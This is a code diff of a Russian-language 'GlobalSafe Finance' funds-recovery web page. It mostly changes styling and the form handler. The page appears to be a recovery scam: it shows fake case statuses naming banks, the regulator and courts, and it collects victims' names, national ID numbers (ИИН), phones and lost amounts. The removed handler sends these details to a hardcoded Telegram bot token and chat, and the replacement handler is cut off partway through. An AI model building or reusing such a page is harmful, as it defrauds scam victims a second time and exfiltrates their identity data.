@@ -2,63 +2,62 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>GlobalSafe Finance — Центр возврата средств</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="assets/css/global.css">
   <style>
 body{background:#030712;padding-bottom:70px}
-.hero{position:relative;min-height:100vh;display:flex;align-items:center;padding:80px 16px 60px;overflow:hidden}
+.hero{position:relative;min-height:100svh;display:flex;align-items:center;padding:80px 16px 60px;overflow:hidden}
 .hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:50px 50px;mask-image:radial-gradient(ellipse at center,black 30%,transparent 70%)}
-.hero-glow{position:absolute;top:20%;left:50%;transform:translateX(-50%);width:600px;height:600px;background:radial-gradient(circle,rgba(99,102,241,.1),transparent 60%);pointer-events:none}
-.hero-content{position:relative;z-index:2;max-width:700px;margin:0 auto;text-align:center}
-.hero-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;background:rgba(99,102,241,.08);border:1px solid rgba(99,102,241,.12);border-radius:100px;font-size:.68rem;font-weight:600;color:#a5b4fc;margin-bottom:24px}
+.hero-glow{position:absolute;top:20%;left:50%;transform:translateX(-50%);width:min(600px,80vw);height:min(600px,80vw);background:radial-gradient(circle,rgba(99,102,241,.1),transparent 60%);pointer-events:none}
+.hero-content{position:relative;z-index:2;width:100%;max-width:600px;margin:0 auto;text-align:center}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;background:rgba(99,102,241,.08);border:1px solid rgba(99,102,241,.12);border-radius:100px;font-size:.65rem;font-weight:600;color:#a5b4fc;margin-bottom:20px}
 .hero-badge .dot{width:5px;height:5px;background:#6366f1;border-radius:50%;animation:blink 2s ease infinite}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-.hero h1{font-size:clamp(2rem,5vw,3.5rem);font-weight:900;line-height:1.05;letter-spacing:-.03em;margin-bottom:16px}
+.hero h1{font-size:clamp(1.8rem,5vw,3.2rem);font-weight:900;line-height:1.05;letter-spacing:-.03em;margin-bottom:14px}
 .hero h1 .g{background:linear-gradient(135deg,#fff 0%,#818cf8 50%,#c084fc 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hero-desc{font-size:1rem;color:rgba(255,255,255,.35);max-width:480px;margin:0 auto 36px;line-height:1.7;font-weight:300}
-.hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
-.hero-metrics{display:flex;justify-content:center;gap:36px;margin-top:48px;flex-wrap:wrap}
+.hero-desc{font-size:clamp(.85rem,2.5vw,1rem);color:rgba(255,255,255,.35);max-width:420px;margin:0 auto 30px;line-height:1.7}
+.hero-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.hero-metrics{display:flex;justify-content:center;gap:clamp(20px,5vw,40px);margin-top:40px;flex-wrap:wrap}
 .metric{text-align:center}
-.metric-val{font-size:1.8rem;font-weight:900;color:#fff}
-.metric-label{font-size:.65rem;color:rgba(255,255,255,.2);margin-top:2px;text-transform:uppercase;letter-spacing:.8px}
-.search-sec{position:relative;padding:0 16px;margin-top:-30px;z-index:10}
-.search-frame{max-width:600px;margin:0 auto}
-.search-inner{background:rgba(15,15,20,.95);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:16px;backdrop-filter:blur(20px)}
+.metric-val{font-size:clamp(1.4rem,4vw,1.8rem);font-weight:900;color:#fff}
+.metric-label{font-size:.6rem;color:rgba(255,255,255,.2);margin-top:2px;text-transform:uppercase;letter-spacing:.8px}
+.search-sec{position:relative;padding:0 16px;margin-top:-24px;z-index:10}
+.search-frame{max-width:560px;margin:0 auto}
+.search-inner{background:rgba(15,15,20,.95);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:14px;backdrop-filter:blur(20px);position:relative}
 .search-tabs{display:flex;gap:2px;margin-bottom:10px;background:rgba(255,255,255,.02);border-radius:6px;padding:3px}
-.st{flex:1;padding:8px;cursor:pointer;font-weight:600;font-size:.72rem;border:none;border-radius:5px;color:rgba(255,255,255,.25);background:transparent;font-family:inherit;transition:.2s}
+.st{flex:1;padding:8px;cursor:pointer;font-weight:600;font-size:.7rem;border:none;border-radius:5px;color:rgba(255,255,255,.25);background:transparent;font-family:inherit}
 .st.on{color:#fff;background:rgba(99,102,241,.15)}
 .sr{display:flex;gap:6px}
-.si{flex:1;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:8px;font-size:.88rem;font-family:inherit;color:#fff}
+.si{flex:1;padding:11px 12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:8px;font-size:.85rem;font-family:inherit;color:#fff}
 .si::placeholder{color:rgba(255,255,255,.12)}
 .si:focus{border-color:rgba(99,102,241,.3);outline:none}
-.sb{padding:12px 20px;background:#6366f1;color:#fff;border:none;border-radius:8px;font-weight:700;font-size:.82rem;cursor:pointer;font-family:inherit}
-.sb:hover{background:#5558e6}
-.sh{text-align:center;margin-top:8px;font-size:.68rem;color:rgba(255,255,255,.12)}
-.sld{display:none;position:absolute;inset:0;background:rgba(0,0,0,.95);border-radius:12px;z-index:20;flex-direction:column;align-items:center;justify-content:center;gap:10px}
+.sb{padding:11px 18px;background:#6366f1;color:#fff;border:none;border-radius:8px;font-weight:700;font-size:.8rem;cursor:pointer;font-family:inherit;white-space:nowrap}
+.sh{text-align:center;margin-top:6px;font-size:.65rem;color:rgba(255,255,255,.1)}
+.sld{display:none;position:absolute;inset:0;background:rgba(0,0,0,.95);border-radius:12px;z-index:20;flex-direction:column;align-items:center;justify-content:center;gap:8px}
 .sld.on{display:flex}
-.sp{width:30px;height:30px;border:2px solid rgba(255,255,255,.06);border-top-color:#6366f1;border-radius:50%;animation:spin .7s linear infinite}
+.sp{width:28px;height:28px;border:2px solid rgba(255,255,255,.06);border-top-color:#6366f1;border-radius:50%;animation:spin .7s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
-.sl{color:rgba(255,255,255,.3);font-size:.78rem}
-.rw{max-width:600px;margin:30px auto;padding:0 16px}
-.cls{max-width:600px;margin:40px auto;padding:0 16px}
-.clsh h2{font-size:.88rem;font-weight:700;display:flex;align-items:center;gap:8px;color:rgba(255,255,255,.7);margin-bottom:12px}
+.sl{color:rgba(255,255,255,.3);font-size:.75rem}
+.rw{max-width:560px;margin:24px auto;padding:0 16px}
+.cls{max-width:560px;margin:32px auto;padding:0 16px}
+.clsh h2{font-size:.85rem;font-weight:700;display:flex;align-items:center;gap:8px;color:rgba(255,255,255,.7);margin-bottom:10px}
 .clsh h2::before{content:'';width:2px;height:12px;background:linear-gradient(180deg,#6366f1,#8b5cf6);border-radius:1px}
-.clsi{display:grid;gap:6px}
-.cli{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.03);border-radius:8px;padding:12px;cursor:pointer;transition:.2s}
-.cli:hover{border-color:rgba(99,102,241,.15);transform:translateX(2px)}
+.clsi{display:grid;gap:5px}
+.cli{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.03);border-radius:8px;padding:10px 12px;cursor:pointer;transition:.2s}
+.cli:hover,.cli:active{border-color:rgba(99,102,241,.15)}
 .clr{display:flex;justify-content:space-between;align-items:center;gap:4px}
-.clr+.clr{margin-top:4px}
-.cln{font-weight:700;font-size:.75rem;font-family:monospace;color:rgba(255,255,255,.5)}
-.clf{font-weight:600;font-size:.8rem;color:#fff}
-.clci{font-size:.65rem;color:rgba(255,255,255,.2)}
-.clp{font-size:.65rem;color:rgba(255,255,255,.2)}
-.clam{font-weight:600;font-size:.72rem;color:#f87171}
-.clph{font-size:.58rem;color:rgba(255,255,255,.12);font-family:monospace}
-.cld{font-size:.55rem;color:rgba(255,255,255,.08)}
-.clb{padding:2px 6px;border-radius:4px;font-size:.58rem;font-weight:600;white-space:nowrap}
+.clr+.clr{margin-top:3px}
+.cln{font-weight:700;font-size:.72rem;font-family:monospace;color:rgba(255,255,255,.5)}
+.clf{font-weight:600;font-size:.78rem;color:#fff}
+.clci{font-size:.62rem;color:rgba(255,255,255,.2)}
+.clp{font-size:.62rem;color:rgba(255,255,255,.2)}
+.clam{font-weight:600;font-size:.7rem;color:#f87171}
+.clph{font-size:.55rem;color:rgba(255,255,255,.12);font-family:monospace}
+.cld{font-size:.5rem;color:rgba(255,255,255,.08)}
+.clb{padding:2px 5px;border-radius:4px;font-size:.55rem;font-weight:600;white-space:nowrap}
 .clb-new{background:rgba(148,163,184,.08);color:#94a3b8}
 .clb-docs_collect,.clb-docs_ready{background:rgba(245,158,11,.08);color:#fbbf24}
 .clb-bank_check,.clb-bank_review{background:rgba(99,102,241,.08);color:#818cf8}
@@ -67,104 +66,94 @@ body{background:#030712;padding-bottom:70px}
 .clb-return_process,.clb-return_done{background:rgba(16,185,129,.08);color:#6ee7b7}
 .clb-partial_return{background:rgba(245,158,11,.08);color:#fbbf24}
 .clb-blocked{background:rgba(239,68,68,.08);color:#fca5a5}
-.empt{text-align:center;padding:40px 20px;color:rgba(255,255,255,.12)}
-.empt-i{font-size:2rem;margin-bottom:8px}
-.ctas{max-width:600px;margin:40px auto;padding:0 16px}
-.ctac{background:linear-gradient(135deg,rgba(99,102,241,.05),rgba(139,92,246,.03));border:1px solid rgba(99,102,241,.08);border-radius:14px;padding:32px;text-align:center}
-.ctat{font-size:1.1rem;font-weight:800;color:#fff;margin-bottom:6px}
-.ctad{color:rgba(255,255,255,.3);margin-bottom:16px;font-size:.85rem}
-.mo{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(8px);z-index:2000;align-items:center;justify-content:center;padding:16px}
+.empt{text-align:center;padding:32px 20px;color:rgba(255,255,255,.12)}
+.empt-i{font-size:1.8rem;margin-bottom:6px}
+.ctas{max-width:560px;margin:32px auto;padding:0 16px}
+.ctac{background:linear-gradient(135deg,rgba(99,102,241,.05),rgba(139,92,246,.03));border:1px solid rgba(99,102,241,.08);border-radius:14px;padding:28px;text-align:center}
+.ctat{font-size:1rem;font-weight:800;color:#fff;margin-bottom:4px}
+.ctad{color:rgba(255,255,255,.3);margin-bottom:14px;font-size:.82rem}
+.bb{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:6px;padding:5px 10px;font-size:.7rem;font-weight:600;cursor:pointer;font-family:inherit;color:rgba(255,255,255,.35);margin-bottom:10px;display:none}
+/* Modal */
+.mo{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:2000;align-items:flex-end;justify-content:center;padding:0}
 .mo.on{display:flex}
-.ml{background:#0f0f14;border:1px solid rgba(255,255,255,.06);border-radius:14px;width:100%;max-width:440px;max-height:85vh;overflow-y:auto;padding:24px;position:relative}
-.mx{position:absolute;top:12px;right:12px;background:none;border:none;color:rgba(255,255,255,.2);font-size:1rem;cursor:pointer}
+.ml{background:#0f0f14;border-radius:16px 16px 0 0;width:100%;max-width:480px;max-height:85vh;overflow-y:auto;padding:24px 20px 32px;animation:mu .3s ease}
+@keyframes mu{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.mx{position:absolute;top:12px;right:12px;background:none;border:none;color:rgba(255,255,255,.2);font-size:1rem;cursor:pointer;padding:8px}
 .mx:hover{color:#fff}
-.ml h2{font-size:.95rem;font-weight:800;color:#fff;margin-bottom:16px}
+.ml h2{font-size:1rem;font-weight:800;color:#fff;margin-bottom:16px}
 .fg{margin-bottom:10px}
-.fg label{display:block;font-size:.58rem;font-weight:600;color:rgba(255,255,255,.25);margin-bottom:4px;text-transform:uppercase;letter-spacing:.6px}
-.fg input,.fg textarea{width:100%;padding:10px 12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:6px;font-size:.82rem;font-family:inherit;color:#fff}
+.fg label{display:block;font-size:.6rem;font-weight:600;color:rgba(255,255,255,.25);margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.fg input,.fg textarea{width:100%;padding:11px 12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:8px;font-size:.85rem;font-family:inherit;color:#fff;-webkit-appearance:none}
 .fg input::placeholder,.fg textarea::placeholder{color:rgba(255,255,255,.1)}
-.fg input:focus,.fg textarea:focus{border-color:rgba(99,102,241,.3);outline:none}
+.fg input:focus,.fg textarea:focus{border-color:rgba(99,102,241,.4);outline:none;background:rgba(255,255,255,.06)}
 .fg textarea{height:60px;resize:vertical}
-.fb{width:100%;padding:12px;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:.88rem;font-weight:700;cursor:pointer;font-family:inherit;margin-top:4px}
-.fb:hover{background:#5558e6}
+.fb{width:100%;padding:14px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:inherit;margin-top:6px;-webkit-tap-highlight-color:transparent}
+.fb:active{transform:scale(.98)}
 .fb:disabled{opacity:.4;cursor:not-allowed}
-.fs{text-align:center;padding:16px 0}
+.fs{text-align:center;padding:20px 0}
 .fs h3{color:#fff;margin-bottom:4px;font-size:.95rem}
 .fs p{color:rgba(255,255,255,.3);font-size:.82rem}
-.bb{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:6px;padding:6px 12px;font-size:.72rem;font-weight:600;cursor:pointer;font-family:inherit;color:rgba(255,255,255,.35);margin-bottom:12px;display:none}
-.bb:hover{color:#fff;border-color:rgba(99,102,241,.2)}
   </style>
 </head>
 <body>
   <div id="nav-container" data-page="home"></div>
-
   <section class="hero">
     <div class="hero-grid"></div><div class="hero-glow"></div>
     <div class="hero-content">
-      <div class="hero-badge"><span class="dot"></span>Платформа координации с организациями</div>
+      <div class="hero-badge"><span class="dot"></span>Платформа координации</div>
       <h1>Ваш центр<br><span class="g">взаимодействия</span></h1>
-      <p class="hero-desc">Отслеживайте статус обращений, подавайте заявки в регуляторы, банки и правоохранительные органы — всё в одном месте.</p>
+      <p class="hero-desc">Отслеживайте обращения, подавайте заявки в организации — всё в одном месте.</p>
       <div class="hero-actions">
-        <a href="contacts/" class="btn btn-fill">Оставить заявку</a>
-        <a href="success/" class="btn" style="background:rgba(255,255,255,.05);color:rgba(255,255,255,.6);border:1px solid rgba(255,255,255,.1)">Наши кейсы</a>
+        <button class="btn btn-fill" onclick="document.getElementById('mo').classList.add('on')">Оставить заявку</button>
+        <a href="success/" class="btn" style="background:rgba(255,255,255,.05);color:rgba(255,255,255,.6);border:1px solid rgba(255,255,255,.1)">Кейсы</a>
       </div>
       <div class="hero-metrics">
         <div class="metric"><div class="metric-val">87%</div><div class="metric-label">Без суда</div></div>
         <div class="metric"><div class="metric-val">24ч</div><div class="metric-label">Реакция</div></div>
-        <div class="metric"><div class="metric-val">316 млрд</div><div class="metric-label">В контуре ₸</div></div>
+        <div class="metric"><div class="metric-val">316 млрд</div><div class="metric-label">₸ в контуре</div></div>
       </div>
     </div>
   </section>
-
   <section class="search-sec">
     <div class="search-frame">
-      <div class="search-inner" style="position:relative">
+      <div class="search-inner">
         <div class="sld" id="sld"><div class="sp"></div><div class="sl">Обработка...</div></div>
         <div class="search-tabs">
           <button class="st on" data-t="case">Номер дела</button>
           <button class="st" data-t="name">ФИО</button>
           <button class="st" data-t="phone">Телефон</button>
         </div>
-        <form id="sf"><div class="sr"><input type="text" id="si" class="si" placeholder="Введите номер дела, ФИО или телефон" autocomplete="off"><button type="submit" class="sb">Проверить</button></div></form>
-        <p class="sh">Отслеживайте статус вашего дела</p>
+        <form id="sf"><div class="sr"><input type="text" id="si" class="si" placeholder="Введите данные" autocomplete="off"><button type="submit" class="sb">Проверить</button></div></form>
+        <p class="sh">Отслеживайте статус дела</p>
       </div>
     </div>
   </section>
-
-  <div style="max-width:600px;margin:0 auto;padding:0 16px"><button id="bb" class="bb" onclick="backToList()">← Назад к списку</button></div>
+  <div style="max-width:560px;margin:0 auto;padding:0 16px"><button id="bb" class="bb" onclick="backToList()">← Назад</button></div>
   <section id="rw" class="rw"></section>
-
   <section class="cls" id="cs">
     <div class="clsh"><h2>Активные дела</h2></div>
     <div id="cl" class="clsi"><div class="empt"><div class="empt-i">📋</div><p>Нет активных дел</p></div></div>
   </section>
+  <section class="ctas"><div class="ctac"><div class="ctat">Центр координации</div><div class="ctad">Всё в одном месте</div><button class="btn btn-fill" onclick="document.getElementById('mo').classList.add('on')">Оставить заявку</button></div></section>
+  <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
 
-  <section class="ctas">
-    <div class="ctac">
-      <div class="ctat">Центр координации</div>
-      <div class="ctad">Подайте обращение в любую организацию. Всё в одном месте.</div>
-      <a href="contacts/" class="btn btn-fill">Оставить заявку →</a>
-    </div>
-  </section>
-
-  <footer class="ftr"><p>© 2026 GlobalSafe Finance · Алматы · Сингапур · Лондон</p></footer>
-
+  <!-- Modal -->
   <div class="mo" id="mo">
     <div class="ml">
-      <button class="mx" onclick="cm()">✕</button>
+      <button class="mx" onclick="document.getElementById('mo').classList.remove('on')">✕</button>
       <h2>📋 Заявка</h2>
       <form id="tf">
         <div class="fg"><label>ФИО *</label><input type="text" name="name" placeholder="Иванов Иван" required></div>
         <div class="fg"><label>ИИН *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div>
         <div class="fg"><label>Телефон *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div>
         <div class="fg"><label>Доп. номера</label><input type="text" name="extraPhones"></div>
-        <div class="fg"><label>Сумма (₸)</label><input type="text" name="amount"></div>
-        <div class="fg"><label>Платформа</label><input type="text" name="company"></div>
-        <div class="fg"><label>Когда звонить</label><input type="text" name="callTime"></div>
-        <div class="fg"><label>Детали</label><textarea name="comment"></textarea></div>
-        <button type="submit" class="fb">Отправить</button>
+        <div class="fg"><label>Сумма (₸)</label><input type="text" name="amount" placeholder="500 000"></div>
+        <div class="fg"><label>Платформа</label><input type="text" name="company" placeholder="Название компании"></div>
+        <div class="fg"><label>Когда звонить</label><input type="text" name="callTime" placeholder="Пн-Пт 10-18"></div>
+        <div class="fg"><label>Детали</label><textarea name="comment" placeholder="Что произошло..."></textarea></div>
+        <button type="submit" class="fb">Отправить заявку</button>
       </form>
-      <div id="fs" class="fs" style="display:none"><h3>✅ Отправлено!</h3><p>Свяжемся с вами.</p></div>
+      <div id="fs" class="fs" style="display:none"><h3>✅ Отправлено!</h3><p>Мы свяжемся с вами.</p></div>
     </div>
   </div>
 
@@ -176,17 +165,58 @@ body{background:#030712;padding-bottom:70px}
   function mp(p){if(!p||p.length<7)return p;return p.substring(0,4)+'****'+p.substring(p.length-3)}
   function fd(d){if(!d)return'—';var p=d.split('-');return p[2]+'.'+p[1]+'.'+p[0]}
   function cs(s){if(['new'].includes(s))return's-new';if(['docs_collect','docs_ready'].includes(s))return's-docs';if(['bank_check','bank_review'].includes(s))return's-bank';if(['regulator','regulator_review'].includes(s))return's-reg';if(['court_prep','court','court_win'].includes(s))return's-court';if(['return_done'].includes(s))return's-done';if(['partial_return'].includes(s))return's-partial';if(['blocked'].includes(s))return's-blocked';if(['return_process'].includes(s))return's-return';return's-new'}
-  function bh(h){if(!h||!h.length)return'';return'<div class="hist">'+h.map(function(e){var tc='hi-s';if(e.type==='success')tc='hi-ok';else if(e.type==='warning')tc='hi-w';else if(e.type==='action')tc='hi-a';else if(e.type==='info')tc='hi-i';return'<div class="hi '+tc+'"><div class="hic">'+e.icon+'</div><div class="hicont"><div class="hit">'+e.text+'</div><div class="hid">'+e.date+' '+e.time+'</div></div></div>'}).join('')+'</div>'}
-  function bn(s){var m={new:[{icon:'📞',text:'Специалист свяжется в течение 24 часов',time:'Ближайшее время'},{icon:'📋',text:'Анализ ситуации',time:'1-2 дня'}],docs_collect:[{icon:'📄',text:'Сбор документов',time:'3-7 дней'}],docs_ready:[{icon:'⚖️',text:'Правовая позиция',time:'2-3 дня'}],bank_check:[{icon:'🏦',text:'Ожидание ответа банка',time:'5-30 дней'}],bank_review:[{icon:'🔍',text:'Проверка банка',time:'15-45 дней'}],regulator:[{icon:'🏛️',text:'Регистрация в АРРФР',time:'5-10 дней'}],regulator_review:[{icon:'🏛️',text:'Проверка регулятором',time:'30-90 дней'}],court_prep:[{icon:'📝',text:'Подготовка иска',time:'3-5 дней'}],court:[{icon:'🏛️',text:'Судебное заседание',time:'1-6 месяцев'}],court_win:[{icon:'📄',text:'Исполнительный лист',time:'5-10 дней'}],return_process:[{icon:'💰',text:'Зачисление средств',time:'3-10 дней'}],return_done:[{icon:'✅',text:'Средства возвращены',time:'Завершено'}],partial_return:[{icon:'💰',text:'Часть средств на счёте',time:'Проверьте'}],blocked:[{icon:'📞',text:'Связаться с куратором',time:'Срочно'}]};var l=m[s]||m.new;return'<div class="ns">'+l.map(function(s,i){return'<div class="ni" style="animation-delay:'+(i*.1+.1)+'s"><div class="nic">'+s.icon+'</div><div class="nit">'+s.text+'</div><div class="nitme">'+s.time+'</div></div>'}).join('')+'</div>'}
-  function rr(c){var cls=cs(c.status);var am={new:{cls:'info',text:'Заявление принято. Свяжемся в течение 24 часов.'},docs_collect:{cls:'warn',text:'Необходимо предоставить документы.'},docs_ready:{cls:'info',text:'Документы получены. Передано юристу.'},bank_check:{cls:'info',text:'Запрос отправлен в банк.'},bank_review:{cls:'info',text:'Банк рассматривает оспаривание.'},regulator:{cls:'info',text:'Дело передано в АРРФР.'},regulator_review:{cls:'info',text:'Регулятор рассматривает.'},court_prep:{cls:'warn',text:'Готовится иск.'},court:{cls:'info',text:'Дело в суде.'},court_win:{cls:'ok',text:'Суд вынес решение!'},return_process:{cls:'ok',text:'Возврат запущен.'},return_done:{cls:'ok',text:'Средства возвращены!'},partial_return:{cls:'warn',text:'Часть средств возвращена.'},blocked:{cls:'warn',text:'Дело приостановлено.'}};var a=am[c.status]||am.new;var amt=c.amount?c.amount.toLocaleString('ru-RU')+' ₸':'—';var h='<div class="cc"><div class="ch '+cls+'"><div class="cid">ДЕЛО № '+c.caseNumber+'</div><div class="ct">'+c.statusName+'</div><div class="cs">'+c.firstName+' '+c.lastName+' · '+c.city+'</div></div><div class="cb"><div class="ca '+a.cls+'">'+a.text+'</div><div class="cg"><div class="cf"><label>ФИО</label><span>'+c.firstName+' '+c.lastName+'</span></div><div class="cf"><label>Телефон</label><span>'+mp(c.phone)+'</span></div><div class="cf"><label>Город</label><span>'+c.city+'</span></div><div class="cf"><label>Платформа</label><span>'+c.platform+'</span></div><div class="cf"><label>Сумма</label><span>'+amt+'</span></div><div class="cf"><label>Обновлено</label><span>'+fd(c.lastUpdate)+'</span></div></div>';if(c.history&&c.history.length)h+='<div class="stl">История</div>'+bh(c.history);h+='<div class="stl">📋 Далее</div>'+bn(c.status)+'</div></div>';return h}
+  function bh(h){if(!h||!h.length)return'';return'<div style="margin:0 0 8px">'+h.map(function(e){var tc='hi-s';if(e.type==='success')tc='hi-ok';else if(e.type==='warning')tc='hi-w';else if(e.type==='action')tc='hi-a';else if(e.type==='info')tc='hi-i';return'<div class="hi '+tc+'"><div class="hic">'+e.icon+'</div><div class="hicont"><div class="hit">'+e.text+'</div><div class="hid">'+e.date+' '+e.time+'</div></div></div>'}).join('')+'</div>'}
+  function bn(s){var m={new:[{icon:'📞',text:'Свяжемся в течение 24 часов',time:'Скоро'},{icon:'📋',text:'Анализ ситуации',time:'1-2 дня'}],docs_collect:[{icon:'📄',text:'Сбор документов',time:'3-7 дней'}],docs_ready:[{icon:'⚖️',text:'Правовая позиция',time:'2-3 дня'}],bank_check:[{icon:'🏦',text:'Ожидание ответа банка',time:'5-30 дней'}],bank_review:[{icon:'🔍',text:'Проверка банка',time:'15-45 дней'}],regulator:[{icon:'🏛️',text:'Регистрация в АРРФР',time:'5-10 дней'}],regulator_review:[{icon:'🏛️',text:'Проверка регулятором',time:'30-90 дней'}],court_prep:[{icon:'📝',text:'Подготовка иска',time:'3-5 дней'}],court:[{icon:'🏛️',text:'Суд',time:'1-6 месяцев'}],court_win:[{icon:'📄',text:'Исполнительный лист',time:'5-10 дней'}],return_process:[{icon:'💰',text:'Зачисление',time:'3-10 дней'}],return_done:[{icon:'✅',text:'Завершено',time:'Готово'}],partial_return:[{icon:'💰',text:'Часть средств',time:'Проверьте'}],blocked:[{icon:'📞',text:'Связаться с куратором',time:'Срочно'}]};var l=m[s]||m.new;return'<div class="ns">'+l.map(function(s,i){return'<div class="ni" style="animation-delay:'+(i*.1+.1)+'s"><div class="nic">'+s.icon+'</div><div class="nit">'+s.text+'</div><div class="nitme">'+s.time+'</div></div>'}).join('')+'</div>'}
+  function rr(c){var cls=cs(c.status);var am={new:{cls:'info',text:'Принято. Свяжемся в течение 24 часов.'},docs_collect:{cls:'warn',text:'Нужны документы.'},docs_ready:{cls:'info',text:'Документы получены.'},bank_check:{cls:'info',text:'Запрос в банке.'},bank_review:{cls:'info',text:'Банк проверяет.'},regulator:{cls:'info',text:'В АРРФР.'},regulator_review:{cls:'info',text:'Регулятор проверяет.'},court_prep:{cls:'warn',text:'Готовится иск.'},court:{cls:'info',text:'В суде.'},court_win:{cls:'ok',text:'Суд вынес решение!'},return_process:{cls:'ok',text:'Возврат запущен.'},return_done:{cls:'ok',text:'Завершено!'},partial_return:{cls:'warn',text:'Часть возвращена.'},blocked:{cls:'warn',text:'Приостановлено.'}};var a=am[c.status]||am.new;var amt=c.amount?c.amount.toLocaleString('ru-RU')+' ₸':'—';var h='<div class="cc"><div class="ch '+cls+'"><div class="cid">ДЕЛО № '+c.caseNumber+'</div><div class="ct">'+c.statusName+'</div><div class="cs">'+c.firstName+' '+c.lastName+' · '+c.city+'</div></div><div class="cb"><div class="ca '+a.cls+'">'+a.text+'</div><div class="cg"><div class="cf"><label>ФИО</label><span>'+c.firstName+' '+c.lastName+'</span></div><div class="cf"><label>Телефон</label><span>'+mp(c.phone)+'</span></div><div class="cf"><label>Город</label><span>'+c.city+'</span></div><div class="cf"><label>Платформа</label><span>'+c.platform+'</span></div><div class="cf"><label>Сумма</label><span>'+amt+'</span></div><div class="cf"><label>Обновлено</label><span>'+fd(c.lastUpdate)+'</span></div></div>';if(c.history&&c.history.length)h+='<div class="stl">История</div>'+bh(c.history);h+='<div class="stl">📋 Далее</div>'+bn(c.status)+'</div></div>';return h}
   function search(q){if(!clients||!q)return null;var s=q.toLowerCase().trim();return clients.find(function(c){return(c.caseNumber&&c.caseNumber.toLowerCase().includes(s))||(c.firstName&&c.firstName.toLowerCase().includes(s))||(c.lastName&&c.lastName.toLowerCase().includes(s))||(c.phone&&c.phone.includes(s))})}
   window.sc=function(cn){var c=clients.find(function(x){return x.caseNumber===cn});if(!c)return;document.getElementById('cs').style.display='none';document.getElementById('rw').innerHTML=rr(c);document.getElementById('bb').style.display='inline-block'};
-  window.backToList=function(){document.getElementById('rw').innerHTML='';document.getElementById('cs').style.display='block';document.getElementById('bb').style.display='none';window.scrollTo({top:0,behavior:'smooth'})};
+  window.backToList=function(){document.getElementById('rw').innerHTML='';document.getElementById('cs').style.display='block';document.getElementById('bb').style.display='none';window.scrollTo({top:0})};
   document.getElementById('sf').addEventListener('submit',function(e){e.preventDefault();var q=document.getElementById('si').value.trim();if(!q||q.length<2)return;document.getElementById('sld').classList.add('on');document.getElementById('cs').style.display='none';document.getElementById('bb').style.display='inline-block';setTimeout(function(){var c=search(q);document.getElementById('sld').classList.remove('on');if(c){document.getElementById('rw').innerHTML=rr(c)}else{document.getElementById('rw').innerHTML='<div class="empt"><div class="empt-i">🔍</div><p>Не найдено</p></div>'}},800)});
-  function om(){document.getElementById('mo').classList.add('on')}
-  function cm(){document.getElementById('mo').classList.remove('on')}
-  document.getElementById('mo').addEventListener('click',function(e){if(e.target===this)cm()});
-  document.getElementById('tf').addEventListener('submit',async function(e){e.preventDefault();var b=this.querySelector('.fb');b.disabled=true;b.textContent='Отправка...';var fd=new FormData(this);var t='📋 *Заявка*\n\n👤 ФИО: '+fd.get('name')+'\n🆔 ИИН: '+fd.get('iin')+'\n📱 Телефон: '+fd.get('phone');if(fd.get('extraPhones'))t+='\n📞 Доп: '+fd.get('extraPhones');if(fd.get('amount'))t+='\n💰 Сумма: '+fd.get('amount')+' ₸';if(fd.get('company'))t+='\n🏢 Платформа: '+fd.get('company');if(fd.get('callTime'))t+='\n📅 Звонить: '+fd.get('callTime');if(fd.get('comment'))t+='\n💬 '+fd.get('comment');try{var r=await fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:t})});if(r.ok){document.getElementById('tf').style.display='none';document.getElementById('fs').style.display='block'}else{alert('Ошибка');b.disabled=false;b.textContent='Отправить'}}catch(err){alert('Ошибка сети');b.disabled=false;b.textContent='Отправить'}});
+  
+  // FORM SUBMIT -_FIXED
+  document.getElementById('tf').addEventListener('submit',function(e){
+    e.preventDefault();
+    var self=this;
+    var btn=self.querySelector('.fb');
+    btn.disabled=true;
+    btn.textContent='Отправка...';
+    
+    var fd=new FormData(self);
+    var name=fd.get('name')||'';
+    var iin=fd.get('iin')||'';
+    var phone=fd.get('phone')||'';
+    var extra=fd.get('extraPhones')||'';
